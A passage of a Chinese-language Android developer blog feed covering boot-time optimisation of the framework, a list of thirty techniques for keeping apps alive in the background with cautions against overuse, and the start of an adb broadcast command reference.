class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><h4 id="开机过程CPU满载"><a href="#开机过程CPU满载" class="headerlink" title="开机过程CPU满载"></a><strong>开机过程CPU满载</strong></h4></li></ul><p>开机过程中让CPU火力全开，能有效减少开机时间</p><p><strong>/device/qcom/common/rootdir/etc/init.qcom.rc</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> on early-init</span><br><span class="line">+    write /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor performance</span><br><span class="line">+    write /sys/devices/system/cpu/cpu1/cpufreq/scaling_governor performance</span><br><span class="line">+    write /sys/devices/system/cpu/cpu2/cpufreq/scaling_governor performance</span><br><span class="line">+    write /sys/devices/system/cpu/cpu3/cpufreq/scaling_governor performance</span><br><span class="line">+    write /sys/devices/system/cpu/cpu4/cpufreq/scaling_governor performance</span><br><span class="line">+    write /sys/devices/system/cpu/cpu5/cpufreq/scaling_governor performance</span><br><span class="line">+    write /sys/devices/system/cpu/cpu6/cpufreq/scaling_governor performance</span><br><span class="line">+    write /sys/devices/system/cpu/cpu7/cpufreq/scaling_governor performance</span><br></pre></td></tr></table></figure><p>注意：</p><blockquote><ul><li>init.qcom.rc是高通定制的init脚本，是开机时必然执行的。</li><li>如果CPU原本就已经满载了，那么此修改则无效果。</li><li>不同平台CPU的配置不尽相同。</li></ul></blockquote><ul><li><h4 id="移除SystemService"><a href="#移除SystemService" class="headerlink" title="移除SystemService"></a><strong>移除SystemService</strong></h4></li></ul><p>SystemServer进程启动后，会启动很多SystemService，根据实际场景，裁剪非必要的Service</p><p><strong>frameworks/base/services/java/com/android/server/SystemServer.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Start services.</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">t.traceBegin(<span class="string">&quot;StartServices&quot;</span>);</span><br><span class="line">startBootstrapServices(t);</span><br><span class="line">startCoreServices(t);</span><br><span class="line">startOtherServices(t);</span><br><span class="line">startApexServices(t);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">Slog.e(<span class="string">&quot;System&quot;</span>, <span class="string">&quot;******************************************&quot;</span>);</span><br><span class="line">Slog.e(<span class="string">&quot;System&quot;</span>, <span class="string">&quot;************ Failure starting system services&quot;</span>, ex);</span><br><span class="line"><span class="keyword">throw</span> ex;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">t.traceEnd(); <span class="comment">// StartServices</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可裁剪的Service如下，仅供参考</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.VibratorService          震动器服务  </span><br><span class="line">2.ClipboardService         粘贴板服务  </span><br><span class="line">3.FingerprintService       指纹  </span><br><span class="line"></span><br><span class="line">4.BatteryService           电池服务，当电量不足时发广播  </span><br><span class="line">5.AlarmManagerService      闹钟服务   </span><br><span class="line">6.WallpaperManagerService  壁纸管理服务  </span><br><span class="line">7.StatusBarManagerService  状态栏管理服务  </span><br></pre></td></tr></table></figure><p>注意：</p><blockquote><ul><li>从framework层的角度去看问题，我们会发现功能及服务的裁剪，是最直接、最有效地时间及空间优化方法，它可以做到时间与空间的两者兼顾。</li><li>注意app与Service，Service与Service之间的耦合性，避免引起机器的异常，无法开机；</li></ul></blockquote><ul><li><h4 id="移除app源码"><a href="#移除app源码" class="headerlink" title="移除app源码"></a><strong>移除app源码</strong></h4></li></ul><p>修改下面文件中的 PRODUCT_PACKAGES 字段的内容，将不需要的内置应用的名称删除，这样可以缩短 scan packages 的过程。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.build/target/product/core.mk  </span><br><span class="line">2.build/target/product/full_base.mk  </span><br><span class="line">3.build/target/product/full_base_telephony.mk  </span><br><span class="line">4.build/target/product/generic_no_telephony.mk  </span><br></pre></td></tr></table></figure><p>同时，可以删除 <strong>/packages/apps/</strong> 路径下不必要的 app 源码，这样可以缩短编译时间。</p><ul><li><h4 id="apk-odex"><a href="#apk-odex" class="headerlink" title="apk odex"></a><strong>apk odex</strong></h4></li></ul><p>apk odex优化就是以空间换时间，加快apk启动速度，缺点是会消耗内存。</p><p>在 <strong>/device/qcom/{product}/{product}.mk</strong> 加入 <strong>WITH_DEXPREOPT=true</strong> , 打开odex优化</p><p>Android.bp中添加</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">android_app &#123;</span><br><span class="line">dex_preopt: &#123;</span><br><span class="line">        enabled: true,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Android.mk中添加</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_DEX_PREOPT := true</span><br></pre></td></tr></table></figure><ul><li><h4 id="PMS优化"><a href="#PMS优化" class="headerlink" title="PMS优化"></a><strong>PMS优化</strong></h4></li></ul><p>Apk的扫描安装耗时是大头。通常采用多线程方案，针对Dir或者Dir中的package进行多线程扫描.</p><p>PMS多线程扫描apk，4线程改成8线程，注意，如果客户做了CPU绑核， Android所分配的CPU资源受到限制，导致改成8线程之后反向优化了。</p><p><strong>frameworks/base/services/core/java/com/android/server/pm/ParallelPackageParser.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ParallelPackageParser</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">QUEUE_CAPACITY</span> <span class="operator">=</span> <span class="number">30</span>;</span><br><span class="line"><span class="comment">//    private static final int MAX_THREADS = 4;</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_THREADS</span> <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//省略部分代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><h4 id="Zygote优化"><a href="#Zygote优化" class="headerlink" title="Zygote优化"></a><strong>Zygote优化</strong></h4></li></ul><p>Zygote主要是优化class和resource的预加载，可以减少部分不需要预加载的class和resource，具体优化哪些，根据实际需求来添加。<br>注意：并不是预加载越少越好，如果开机必须启动的进程所需要的class和resource在zygote阶段被优化了，那么也会在该进程自启动时也会去加载，这样优化就是无效的。</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git /frameworks/base/config/preloaded-classes /frameworks/base/config/preloaded-classes</span></span><br><span class="line"><span class="comment">index f2530519247..d6ac1e22e3f 100644</span></span><br><span class="line"><span class="comment">--- /frameworks/base/config/preloaded-classes</span></span><br><span class="line"><span class="comment">+++ /frameworks/base/config/preloaded-classes</span></span><br><span class="line"><span class="meta">@@ -806,7 +806,6 @@</span> android.app.VoiceInteractor$Request</span><br><span class="line"> android.app.VoiceInteractor</span><br><span class="line"> android.app.Vr2dDisplayProperties$1</span><br><span class="line"> android.app.Vr2dDisplayProperties</span><br><span class="line"><span class="deletion">-android.app.VrManager</span></span><br><span class="line"> android.app.WaitResult$1</span><br><span class="line"> android.app.WaitResult</span><br><span class="line"> android.app.WallpaperColors$1</span><br><span class="line"><span class="meta">@@ -2471,12 +2470,6 @@</span> android.hardware.display.Time$1</span><br><span class="line"> android.hardware.display.Time</span><br><span class="line"> android.hardware.display.VirtualDisplayConfig$1</span><br><span class="line"> android.hardware.display.VirtualDisplayConfig</span><br><span class="line"><span class="deletion">-android.hardware.display.WifiDisplay$1</span></span><br><span class="line"><span class="deletion">-android.hardware.display.WifiDisplay</span></span><br><span class="line"><span class="deletion">-android.hardware.display.WifiDisplaySessionInfo$1</span></span><br><span class="line"><span class="deletion">-android.hardware.display.WifiDisplaySessionInfo</span></span><br><span class="line"><span class="deletion">-android.hardware.display.WifiDisplayStatus$1</span></span><br><span class="line"><span class="deletion">-android.hardware.display.WifiDisplayStatus</span></span><br><span class="line"> android.hardware.face.Face$1</span><br><span class="line"> android.hardware.face.Face</span><br><span class="line"> android.hardware.face.FaceManager$1</span><br></pre></td></tr></table></figure><ul><li><h4 id="移除手势导航"><a href="#移除手势导航" class="headerlink" title="移除手势导航"></a><strong>移除手势导航</strong></h4></li></ul><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git /frameworks/base/packages/overlays/Android.mk /frameworks/base/packages/overlays/Android.mk</span></span><br><span class="line"><span class="comment">index 69641e69a9f..71f5fd00520 100644</span></span><br><span class="line"><span class="comment">--- /frameworks/base/packages/overlays/Android.mk</span></span><br><span class="line"><span class="comment">+++ /frameworks/base/packages/overlays/Android.mk</span></span><br><span class="line"><span class="meta">@@ -20,17 +20,8 @@</span> LOCAL_LICENSE_KINDS := SPDX-license-identifier-Apache-2.0</span><br><span class="line"> LOCAL_LICENSE_CONDITIONS := notice</span><br><span class="line"> LOCAL_NOTICE_FILE := $(LOCAL_PATH)/../../NOTICE</span><br><span class="line"> LOCAL_REQUIRED_MODULES := \</span><br><span class="line"><span class="deletion">-DisplayCutoutEmulationCornerOverlay \</span></span><br><span class="line"><span class="deletion">-DisplayCutoutEmulationDoubleOverlay \</span></span><br><span class="line"><span class="deletion">-    DisplayCutoutEmulationHoleOverlay \</span></span><br><span class="line"><span class="deletion">-DisplayCutoutEmulationTallOverlay \</span></span><br><span class="line"><span class="deletion">-DisplayCutoutEmulationWaterfallOverlay \</span></span><br><span class="line">FontNotoSerifSourceOverlay \</span><br><span class="line">NavigationBarMode3ButtonOverlay \</span><br><span class="line"><span class="deletion">-NavigationBarModeGesturalOverlay \</span></span><br><span class="line"><span class="deletion">-NavigationBarModeGesturalOverlayNarrowBack \</span></span><br><span class="line"><span class="deletion">-NavigationBarModeGesturalOverlayWideBack \</span></span><br><span class="line"><span class="deletion">-NavigationBarModeGesturalOverlayExtraWideBack \</span></span><br><span class="line">preinstalled-packages-platform-overlays.xml</span><br><span class="line"> </span><br><span class="line"> include $(BUILD_PHONY_PACKAGE)</span><br></pre></td></tr></table></figure><ul><li><h4 id="关闭壁纸服务"><a href="#关闭壁纸服务" class="headerlink" title="关闭壁纸服务"></a><strong>关闭壁纸服务</strong></h4></li></ul><p><strong>frameworks/base/core/res/res/values/config.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- True if WallpaperService is enabled --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bool</span> <span class="attr">name</span>=<span class="string">&quot;config_enableWallpaperService&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><h4 id="调整窗口动画渲染"><a href="#调整窗口动画渲染" class="headerlink" title="调整窗口动画渲染"></a><strong>调整窗口动画渲染</strong></h4></li></ul><p><strong>frameworks/base/packages/SettingsProvider/res/values/defaults.xml</strong></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-    &lt;fraction name=&quot;def_window_animation_scale&quot;&gt;100%&lt;/fraction&gt;</span></span><br><span class="line"><span class="deletion">-    &lt;fraction name=&quot;def_window_transition_scale&quot;&gt;100%&lt;/fraction&gt;</span></span><br><span class="line"><span class="addition">+    &lt;fraction name=&quot;def_window_animation_scale&quot;&gt;25%&lt;/fraction&gt;</span></span><br><span class="line"><span class="addition">+    &lt;fraction name=&quot;def_window_transition_scale&quot;&gt;25%&lt;/fraction&gt;</span></span><br></pre></td></tr></table></figure><p>如果想关闭animaton，直接将数值改为0即可。<br>注意：芯片商可能会定制 <strong>defaults.xml</strong> ，所以在修改时请留意是否改全。</p><ul><li><h4 id="专项优化"><a href="#专项优化" class="headerlink" title="专项优化"></a><strong>专项优化</strong></h4></li></ul><p>针对实际项目，如果加了自定义的开机自启动项，那么可以抓trace，看看整个开机过程哪个启动项耗时较长</p><p>例如：</p><p><img src="/images/20240316/20240316017.jpg"></p><p>上图可以看到 <strong>avm_worker</strong> 存在耗时异常， 该进程为 android 侧的 360 环视功能， 可以找对应开发确认是否需要开机启动。</p><ul><li><h4 id="Google优化方案"><a href="#Google优化方案" class="headerlink" title="Google优化方案"></a><strong>Google优化方案</strong></h4></li></ul><p>详见：<a href="https://source.android.google.cn/docs/core/perf/boot-times?hl=zh-cn">source.android.google.cn/docs/core/perf/boot-times?hl=zh-cn</a></p><h3 id="实战总结"><a href="#实战总结" class="headerlink" title="实战总结"></a>实战总结</h3><p>对于Android开机时间优化，framework层可优化的空间较小，通过trace可以看到，一个Service的启动或者众多apk的扫描操作，往往都是在几毫秒或者几十毫秒内完成的，所以，即使关闭某个service的启动或者裁剪部分apk，优化效果也是毫秒级别的，不是很明显，但聚少成多，通过多种优化方案，累加优化时间，最终呈现出来的优化效果就是肉眼可见的。</p><p>而Kernel层的优化空间往往是较大的，都是秒级别的优化幅度，通过底层和上层双向优化，最终能达到比较理想的优化效果。</p><h4 id="bootchart安装包"><a href="#bootchart安装包" class="headerlink" title="bootchart安装包"></a>bootchart安装包</h4><p>链接: <a href="https://pan.baidu.com/s/1BKVd348fZV8xkYLj9hfTzA?pwd=253x">pan.baidu.com/s/1BKVd348fZV8xkYLj9hfTzA?pwd=253x</a> 提取码: 253x</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android应用保活攻略</title>
      <link href="/2024/03/10/2024-03-10/"/>
      <url>/2024/03/10/2024-03-10/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Android应用保活是一个老生常谈的话题，本文尽可能收集市面上的保活手段，希望能对你有所帮助。</p><p>在Android系统中，保活（保持应用进程一直存活）就是为了让应用在后台持续运行，来实现某些特定的功能，如实时消息推送、定位服务等。然而，由于Android系统为了节省资源和保护用户隐私，通常会限制后台应用的运行。因此，我们需要采取一些策略来实现保活。以下是30个常见的Android保活手段，帮助你突破后台限制。</p><h3 id="1-前台服务（Foreground-Service）"><a href="#1-前台服务（Foreground-Service）" class="headerlink" title="1. 前台服务（Foreground Service）"></a>1. 前台服务（Foreground Service）</h3><p>将应用的Service设置为前台服务，这样系统会认为这个服务是用户关心的，不容易被杀死。前台服务需要显示一个通知，告知用户当前服务正在运行。通过调用 <strong>startForeground(int id, Notification notification)</strong> 方法将服务设置为前台服务。</p><p>Android中的进程是托管的，当系统进程空间紧张的时候，会依照优先级自动进行进程的回收。Android将进程分为6个等级,它们按优先级顺序由高到低依次是:</p><ol><li>前台进程( FOREGROUND_APP)</li><li>可视进程(VISIBLE_APP )</li><li>次要服务进程(SECONDARY_SERVER )</li><li>后台进程 (HIDDEN_APP)</li><li>内容供应节点(CONTENT_PROVIDER)</li><li>空进程(EMPTY_APP)</li></ol><h3 id="2-双进程守护"><a href="#2-双进程守护" class="headerlink" title="2. 双进程守护"></a>2. 双进程守护</h3><p>创建两个Service，分别运行在不同的进程中。当一个进程被杀死时，另一个进程可以通过监听 <strong>onServiceDisconnected(ComponentName name)</strong> 方法来感知，并重新启动被杀死的进程。这样可以相互守护，提高应用的存活率。</p><h3 id="3-使用系统广播拉活"><a href="#3-使用系统广播拉活" class="headerlink" title="3. 使用系统广播拉活"></a>3. 使用系统广播拉活</h3><p>使用系统广播拉活。监听系统广播，如开机广播、网络变化广播、应用安装卸载广播等。当收到广播时，检查应用进程是否存活，如果已经被杀死，则重新启动应用。</p><h3 id="4-JobScheduler"><a href="#4-JobScheduler" class="headerlink" title="4. JobScheduler"></a>4. JobScheduler</h3><p>使用JobScheduler定时启动应用。JobScheduler是Android 5.0引入的一种任务调度机制，可以在满足特定条件下执行任务。通过创建一个Job，设置触发条件，然后将Job提交给JobScheduler。当触发条件满足时，JobScheduler会启动应用。</p><h3 id="5-白名单"><a href="#5-白名单" class="headerlink" title="5. 白名单"></a>5. 白名单</h3><p>引导用户将应用加入系统的白名单，如省电白名单、自启动白名单等。加入白名单的应用不会受到系统的限制，可以在后台持续运行。</p><h3 id="6-第三方推送服务"><a href="#6-第三方推送服务" class="headerlink" title="6. 第三方推送服务"></a>6. 第三方推送服务</h3><p>使用第三方推送服务，如极光推送、小米推送等。这些推送服务通常使用保活技巧，可以保证消息的实时推送。</p><h3 id="7-静态广播监听"><a href="#7-静态广播监听" class="headerlink" title="7. 静态广播监听"></a>7. 静态广播监听</h3><p>在AndroidManifest.xml中注册静态广播，监听系统广播，如电池状态改变、屏幕解锁等。当收到广播时，检查应用进程是否存活，如果已经被杀死，则重新启动应用。需要注意的是，从Android 8.0开始，静态广播的使用受到了限制，部分隐式广播无法通过静态注册来接收。</p><h3 id="8-合理利用Activity"><a href="#8-合理利用Activity" class="headerlink" title="8. 合理利用Activity"></a>8. 合理利用Activity</h3><p>在必要时，将应用的Activity设置为singleTask或singleInstance模式，确保应用在后台时只有一个实例。这可以减少系统对应用的限制，提高应用在后台的存活率。</p><h3 id="9-使用AlarmManager定时唤醒"><a href="#9-使用AlarmManager定时唤醒" class="headerlink" title="9. 使用AlarmManager定时唤醒"></a>9. 使用AlarmManager定时唤醒</h3><p>使用AlarmManager定时唤醒应用。通过设置一个定时任务，当到达指定时间时，使用PendingIntent启动应用。需要注意的是，从Android 6.0开始，AlarmManager的行为受到了限制，当设备处于低电量模式时，定时任务可能会被延迟。</p><h3 id="10-合理设置进程优先级"><a href="#10-合理设置进程优先级" class="headerlink" title="10. 合理设置进程优先级"></a>10. 合理设置进程优先级</h3><p>Android系统会根据进程的优先级来决定是否回收进程。通过合理设置进程优先级，可以降低系统回收进程的概率。例如，可以将Service设置为前台服务，或者将进程与用户正在交互的Activity绑定。</p><h3 id="11-使用sticky广播"><a href="#11-使用sticky广播" class="headerlink" title="11. 使用sticky广播"></a>11. 使用sticky广播</h3><p>使用sticky广播在一定程度上可以提高广播接收器的优先级。当发送一个sticky广播时，系统会将该广播存储在内存中，这样即使应用被杀死，也可以在重新启动时收到广播。但需要注意的是，从Android 5.0开始，sticky广播的使用受到了限制，部分广播无法使用sticky模式发送。</p><h3 id="12-使用WorkManager"><a href="#12-使用WorkManager" class="headerlink" title="12. 使用WorkManager"></a>12. 使用WorkManager</h3><p>WorkManager是Android Architecture Components的一部分，它为后台任务提供了一种统一的解决方案。WorkManager可以自动选择最佳的执行方式，即使应用退出或设备重启，它仍然可以确保任务完成。WorkManager在保活方面的效果可能不如其他方法，但它是一种更符合Android系统规范的解决方案，可以避免系统限制和用户体验问题。</p><h3 id="13-合理使用WakeLock"><a href="#13-合理使用WakeLock" class="headerlink" title="13. 合理使用WakeLock"></a>13. 合理使用WakeLock</h3><p>在某些特定场景下，可以使用WakeLock（电源锁）来防止CPU进入休眠状态，从而确保应用能够在后台持续运行。但请注意，WakeLock可能会导致设备电量消耗增加，因此应谨慎使用，并在不需要时尽快释放锁。</p><h3 id="14-合理使用SyncAdapter"><a href="#14-合理使用SyncAdapter" class="headerlink" title="14. 合理使用SyncAdapter"></a>14. 合理使用SyncAdapter</h3><p>SyncAdapter是Android提供的一种同步框架，用于处理数据同步操作。SyncAdapter可以根据设备的网络状态、电池状态等条件来自动调度同步任务。虽然SyncAdapter并非专门用于保活，但它可以在一定程度上提高应用在后台的存活率。</p><h3 id="15-使用AccountManager"><a href="#15-使用AccountManager" class="headerlink" title="15. 使用AccountManager"></a>15. 使用AccountManager</h3><p>通过在应用中添加一个账户，并将其与SyncAdapter关联，可以在一定程度上提高应用的存活率。当系统触发同步操作时，会启动与账户关联的应用进程。但请注意，这种方法可能会对用户造成困扰，因此应谨慎使用。</p><h3 id="16-适配Doze模式和App-Standby"><a href="#16-适配Doze模式和App-Standby" class="headerlink" title="16. 适配Doze模式和App Standby"></a>16. 适配Doze模式和App Standby</h3><p>从Android 6.0（API级别23）开始，系统引入了Doze模式和App Standby，以优化设备的电池使用。在这些模式下，系统会限制后台应用的网络访问和CPU使用。为了保证应用在这些模式下正常运行，您需要适配这些特性，如使用高优先级的Firebase Cloud Messaging（FCM）消息来唤醒应用。</p><h3 id="17-使用Firebase-Cloud-Messaging（FCM）"><a href="#17-使用Firebase-Cloud-Messaging（FCM）" class="headerlink" title="17. 使用Firebase Cloud Messaging（FCM）"></a>17. 使用Firebase Cloud Messaging（FCM）</h3><p>对于需要实时消息推送的应用，可以使用Firebase Cloud Messaging（FCM）服务。FCM是一种跨平台的消息推送服务，可以实现高效且可靠的消息传递。通过使用FCM，您可以确保应用在后台时接收到实时消息，而无需采取过多的保活手段。</p><h3 id="18-遵循Android系统的最佳实践"><a href="#18-遵循Android系统的最佳实践" class="headerlink" title="18. 遵循Android系统的最佳实践"></a>18. 遵循Android系统的最佳实践</h3><p>在开发过程中，遵循Android系统的最佳实践和推荐方案，可以提高应用的兼容性和稳定性。例如，合理使用后台任务、避免长时间运行的服务、优化内存使用等。这样可以降低系统对应用的限制，从而提高应用在后台的存活率。</p><h3 id="19-及时适配新系统版本"><a href="#19-及时适配新系统版本" class="headerlink" title="19. 及时适配新系统版本"></a>19. 及时适配新系统版本</h3><p>随着Android系统版本的更新，系统对后台应用的限制可能会发生变化。为了确保应用在新系统版本上能够正常运行，您需要及时适配新系统版本，并根据需要调整保活策略。</p><h3 id="20-与用户建立信任"><a href="#20-与用户建立信任" class="headerlink" title="20. 与用户建立信任"></a>20. 与用户建立信任</h3><p>在实际开发中，应尽量遵循系统的规范和限制，避免过度使用保活手段。与用户建立信任，告知用户应用在后台运行的原因和目的。在用户授权的情况下，采取适当的保活策略，以实现所需功能。</p><h3 id="21-使用Binder机制"><a href="#21-使用Binder机制" class="headerlink" title="21. 使用Binder机制"></a>21. 使用Binder机制</h3><p>Binder是Android中的一种跨进程通信（IPC）机制。通过在Service中创建一个Binder对象，并在其他进程中获取这个Binder对象，可以使得两个进程建立连接，从而提高Service的存活率。</p><h3 id="22-使用native进程"><a href="#22-使用native进程" class="headerlink" title="22. 使用native进程"></a>22. 使用native进程</h3><p>通过JNI技术，创建一个native进程来守护应用进程。当应用进程被杀死时，native进程可以感知到这个事件，并重新启动应用进程。这种方法需要C/C++知识，并且可能会增加应用的复杂性和维护成本。</p><h3 id="23-使用反射调用隐藏API"><a href="#23-使用反射调用隐藏API" class="headerlink" title="23. 使用反射调用隐藏API"></a>23. 使用反射调用隐藏API</h3><p>Android系统中有一些隐藏的API和系统服务，可以用于提高应用的存活率。例如，通过反射调用ActivityManager的addPersistentProcess方法，可以将应用设置为系统进程，从而提高应用的优先级。然而，这种方法存在很大的风险，可能会导致应用在某些设备或系统版本上无法正常运行。</p><h3 id="24-监听系统UI"><a href="#24-监听系统UI" class="headerlink" title="24 监听系统UI"></a>24 监听系统UI</h3><p>监听系统UI的变化，如状态栏、导航栏等。当系统UI变化时，检查应用进程是否存活，如果已经被杀死，则重新启动应用。</p><h3 id="25-使用多进程"><a href="#25-使用多进程" class="headerlink" title="25. 使用多进程"></a>25. 使用多进程</h3><p>在AndroidManifest.xml中为Service或Activity设置android:process属性，使其运行在单独的进程中。这样，即使主进程被杀死，其他进程仍然可以存活。</p><h3 id="26-使用Provider"><a href="#26-使用Provider" class="headerlink" title="26. 使用Provider"></a>26. 使用Provider</h3><p>在AndroidManifest.xml中注册一个Provider，并在其他应用中通过ContentResolver访问这个Provider。这样，即使应用在后台，只要有其他应用访问Provider，应用就可以保持存活。</p><h3 id="27-关注Android开发者文档和官方博客"><a href="#27-关注Android开发者文档和官方博客" class="headerlink" title="27. 关注Android开发者文档和官方博客"></a>27. 关注Android开发者文档和官方博客</h3><p>Android开发者文档和官方博客是获取保活策略和系统更新信息的重要途径。关注这些资源，以便了解最新的系统特性、开发者指南和最佳实践。</p><h3 id="28-性能优化"><a href="#28-性能优化" class="headerlink" title="28. 性能优化"></a>28. 性能优化</h3><p>优化应用的性能，降低内存、CPU和电池的消耗。这样，系统在资源紧张时可能会优先回收其他消耗较高的应用，从而提高您的应用在后台的存活率。</p><h3 id="29-用户反馈"><a href="#29-用户反馈" class="headerlink" title="29. 用户反馈"></a>29. 用户反馈</h3><p>关注用户的反馈，了解他们在使用应用过程中遇到的问题。根据用户的反馈，调整保活策略，以实现最佳的用户体验。</p><h3 id="30-使用NotificationListenerService"><a href="#30-使用NotificationListenerService" class="headerlink" title="30. 使用NotificationListenerService"></a>30. 使用NotificationListenerService</h3><p>通过实现一个NotificationListenerService并在AndroidManifest.xml中注册，可以监听系统通知栏的变化。当收到新的通知时，检查应用进程是否存活，如果已经被杀死，则重新启动应用。这种方法可以利用系统通知的变化来触发应用的启动，从而提高应用在后台的存活率。需要注意的是，为了使用NotificationListenerService，用户需要在设置中授权应用访问通知权限。</p><h3 id="最后，你真的需要保活吗？"><a href="#最后，你真的需要保活吗？" class="headerlink" title="最后，你真的需要保活吗？"></a>最后，你真的需要保活吗？</h3><p>保活策略可能会导致系统资源消耗增加、用户体验下降，甚至引发系统限制或用户卸载应用。因此，在实际开发中，应根据功能需求和用户体验来权衡保活策略，尽量遵循系统的规范和限制。在可能的情况下，优先考虑使用系统推荐的解决方案，如前台服务、JobScheduler等。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android通过adb命令模拟发送广播</title>
      <link href="/2024/03/09/2024-03-09/"/>
      <url>/2024/03/09/2024-03-09/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过命令行执行adb shell am broadcast发送广播通知。</p><p>adb shell am broadcast 后面的参数有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;INTENT&gt; specifications include these flags and arguments:</span><br><span class="line">[-a &lt;ACTION&gt;] [-d &lt;DATA_URI&gt;] [-t &lt;MIME_TYPE&gt;]</span><br><span class="line">[-c &lt;CATEGORY&gt; [-c &lt;CATEGORY&gt;] ...]</span><br><span 